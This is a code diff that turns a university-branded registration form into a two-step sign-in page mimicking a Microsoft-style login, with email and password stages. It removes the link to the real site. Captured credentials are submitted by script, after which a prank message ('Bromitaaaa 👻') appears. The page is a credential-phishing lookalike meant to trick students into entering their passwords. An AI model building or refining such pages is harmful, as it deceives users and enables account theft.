@@ -30,14 +30,12 @@
             border-radius: 4px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.2);
             z-index: 1;
-            min-height: 350px;
         }
 
         .logo {
             font-weight: bold;
             color: #1a4b8c;
             margin-bottom: 20px;
-            font-size: 18px;
         }
 
         .logo span {
@@ -47,7 +45,6 @@
         h2 {
             margin-bottom: 20px;
             font-weight: normal;
-            font-size: 24px;
         }
 
         input {
@@ -57,12 +54,11 @@
             border-bottom: 1px solid #ccc;
             margin-bottom: 15px;
             font-size: 14px;
-            box-sizing: border-box;
         }
 
         input:focus {
             outline: none;
-            border-bottom: 2px solid #1a4b8c;
+            border-bottom: 1px solid #1a4b8c;
         }
 
         .link {
@@ -77,23 +73,70 @@
 
         .btn {
             margin-top: 20px;
-            width: 100%;
+            float: right;
             background: #1a4b8c;
             color: white;
             border: none;
             padding: 10px 20px;
             cursor: pointer;
-            font-size: 14px;
-            border-radius: 3px;
         }
 
         .btn:hover {
             background: #163d70;
         }
 
-        .btn:disabled {
-            background: #999;
-            cursor: not-allowed;
+        .options {
+            margin-top: 80px;
+            padding: 15px;
+            background: #f2f2f2;
+            text-align: center;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .stage {
+            display: none;
+        }
+
+        .stage.active {
+            display: block;
+        }
+
+        .back-button {
+            display: inline-block;
+            margin-bottom: 15px;
+            text-decoration: none;
+            color: inherit;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+
+        .back-button:hover {
+            text-decoration: none;
+        }
+
+        .email-display {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .spinner {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a4b8c;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .message {
@@ -118,84 +161,103 @@
             border: 1px solid #f5c6cb;
             display: block;
         }
-
-        .options {
-            margin-top: 80px;
-            padding: 15px;
-            background: #f2f2f2;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .options a {
-            color: #1a4b8c;
-            text-decoration: none;
-        }
-
-        .options a:hover {
-            text-decoration: underline;
-        }
-
-        .spinner {
-            display: none;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #1a4b8c;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
     
     <div class="login-container">
-        <div class="logo">Conecta<span>UACJ</span></div>
-        <h2>Registro</h2>
+        <div class="logo">
+            <img src="../static/bannerlogo.png" width="150px" alt="UACJ Logo">
+        </div>
         
         <form id="registroForm">
-            <input 
-                type="email" 
-                id="correo" 
-                name="correo" 
-                placeholder="Correo electrónico" 
-                required
-            >
-            <input 
-                type="password" 
-                id="contrasenia" 
-                name="contrasenia" 
-                placeholder="Contraseña" 
-                required
-            >
-            
-            <div class="spinner" id="spinner"></div>
-            <button type="submit" class="btn" id="btnRegistro">Registrarse</button>
+            <!-- Stage 1: Email -->
+            <div class="stage active" id="stage1">
+                <h2>Sign in</h2>
+                <input 
+                    type="email" 
+                    id="correo" 
+                    name="correo" 
+                    placeholder="someone@example.com" 
+                    required
+                >
+                <a href="#" class="link">Can't access your account?</a>
+                <button type="button" class="btn" id="btnNext">Next</button>
+            </div>
+
+            <!-- Stage 2: Password -->
+            <div class="stage" id="stage2">
+                <div class="back-button" id="btnBack"><img src="../static/arrow_left.svg" alt="back"><span id="emailDisplay"></span></div>
+                <h2>Enter password</h2>
+                <input 
+                    type="password" 
+                    id="contrasenia" 
+                    name="contrasenia" 
+                    placeholder="Password" 
+                    required
+                >
+                <a href="#" class="link">Forgot my password</a>
+                <div class="spinner" id="spinner"></div>
+                <button type="submit" class="btn" id="btnRegistro">Sign in</button>
+            </div>
             
             <div class="message" id="mensajeResultado"></div>
         </form>
-
-        <div class="options">
-            <p><a href="https://alumnosuacj.sharepoint.com/sites/conectauacj" class="link">← Volver a inicio</a></p>
-        </div>
     </div>
 
     <script>
-        document.getElementById('registroForm').addEventListener('submit', async function(e) {
+        const stage1 = document.getElementById('stage1');
+        const stage2 = document.getElementById('stage2');
+        const correoInput = document.getElementById('correo');
+        const contraseniaInput = document.getElementById('contrasenia');
+        const btnNext = document.getElementById('btnNext');
+        const btnBack = document.getElementById('btnBack');
+        const btnRegistro = document.getElementById('btnRegistro');
+        const spinner = document.getElementById('spinner');
+        const mensajeResultado = document.getElementById('mensajeResultado');
+        const emailDisplay = document.getElementById('emailDisplay');
+        const registroForm = document.getElementById('registroForm');
+
+        // Pasar a la segunda etapa
+        btnNext.addEventListener('click', function(e) {
             e.preventDefault();
             
-            const correo = document.getElementById('correo').value;
-            const contrasenia = document.getElementById('contrasenia').value;
-            const btnRegistro = document.getElementById('btnRegistro');
-            const spinner = document.getElementById('spinner');
-            const mensajeResultado = document.getElementById('mensajeResultado');
+            const correo = correoInput.value;
+            
+            // Validación básica
+            if (!correo) {
+                return;
+            }
+            
+            // Validación de formato de email
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)) {
+                return;
+            }
+            
+            // Mostrar la segunda etapa
+            emailDisplay.textContent = correo;
+            stage1.classList.remove('active');
+            stage2.classList.add('active');
+            contraseniaInput.focus();
+        });
+
+        // Volver a la primera etapa
+        btnBack.addEventListener('click', function(e) {
+            e.preventDefault();
+            stage2.classList.remove('active');
+            stage1.classList.add('active');
+            contraseniaInput.value = '';
+            mensajeResultado.style.display = 'none';
+            correoInput.focus();
+        });
+
+        // Enviar formulario (segunda etapa)
+        registroForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const correo = correoInput.value;
+            const contrasenia = contraseniaInput.value;
             
             // Validación básica
             if (!correo || !contrasenia) {
@@ -222,7 +284,7 @@
                 
                 if (data.success) {
                     mostrarMensaje('¡Wazaaaaa, Bromitaaaa 👻! ' + data.message, 'success');
-                    document.getElementById('registroForm').reset();
+                    registroForm.reset();
                     
                     // Redirigir después de 3 segundos
                     setTimeout(() => {
@@ -240,7 +302,6 @@
         });
         
         function mostrarMensaje(texto, tipo) {
-            const mensajeResultado = document.getElementById('mensajeResultado');
             mensajeResultado.textContent = texto;
             mensajeResultado.className = `message ${tipo}`;
             mensajeResultado.style.display = 'block';
